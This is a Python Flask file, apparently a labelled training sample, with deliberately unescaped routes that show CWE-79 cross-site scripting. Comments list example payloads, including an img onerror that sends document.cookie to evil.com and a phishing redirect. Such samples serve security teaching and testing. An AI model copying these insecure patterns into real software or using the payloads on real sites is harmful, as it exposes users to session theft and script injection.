# VULNERABLE: Cross-Site Scripting via Flask render_template_string - Training Sample
# CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
# Severity: HIGH
# Description: User input embedded in HTML responses without encoding allows script injection

from flask import Flask, request, render_template_string, make_response, jsonify
import markupsafe

app = Flask(__name__)


@app.route("/hello")
def hello():
    """VULNERABLE: Name from query param rendered directly in template."""
    name = request.args.get("name", "World")
    # VULN: name = "<script>alert(document.cookie)</script>"
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)


@app.route("/search")
def search():
    """VULNERABLE: Search term reflected in page without encoding."""
    q = request.args.get("q", "")
    # VULN: q = '"><img src=x onerror=fetch("http://evil.com/"+document.cookie)>'
    html = f"""
    <html><body>
    <p>Search results for: {q}</p>
    <div id="results"></div>
    </body></html>
    """
    return render_template_string(html)


@app.route("/error")
def error_page():
    """VULNERABLE: Error message reflected from URL into page."""
    msg = request.args.get("msg", "An error occurred")
    # VULN: msg = "<script>window.location='http://phishing.com'</script>"
    return make_response(f"<html><body><p class='error'>{msg}</p></body></html>", 400)


@app.route("/profile/<username>")
def profile(username):
    """VULNERABLE: URL segment echoed into page without escaping."""
    # VULN: /profile/<script>alert(1)</script>
    template = """
    <html><body>
    <h2>Profile: """ + username + """</h2>
    </body></html>
    """
    return render_template_string(template)


@app.route("/comment", methods=["POST"])
def post_comment():
    """VULNERABLE: Stored comment displayed back without sanitization."""
    comment = request.form.get("comment", "")
    # VULN: comment stored and re-rendered without encoding = stored XSS
    html = f"<div class='comment'>{comment}</div>"
    return render_template_string(html)


@app.route("/redirect")
def redirect_page():
    """VULNERABLE: Redirect URL injected into meta refresh tag."""
    url = request.args.get("url", "/")
    # VULN: url = "javascript:alert(1)" — meta refresh XSS
    return render_template_string(
        f'<html><head><meta http-equiv="refresh" content="0;url={url}"></head></html>'
    )


@app.route("/notify")
def notify():
    """VULNERABLE: Notification message embedded in onclick handler."""
    msg = request.args.get("msg", "")
    # VULN: msg = "';alert(1);'" breaks out of JS string in onclick
    html = f"""
    <html><body>
    <button onclick="notify('{msg}')">Click</button>
    <script>function notify(m){{alert(m);}}</script>
    </body></html>
    """
    return render_template_string(html)


@app.route("/api/user")
def api_user():
    """VULNERABLE: JSON response with Content-Type text/html — parsed as HTML."""
    username = request.args.get("user", "")
    # VULN: Content-Type not set to application/json — browser renders HTML tags
    resp = make_response('{"user": "' + username + '"}')
    resp.headers["Content-Type"] = "text/html"   # VULN: wrong content type
    return resp


if __name__ == "__main__":
    app.run(debug=True)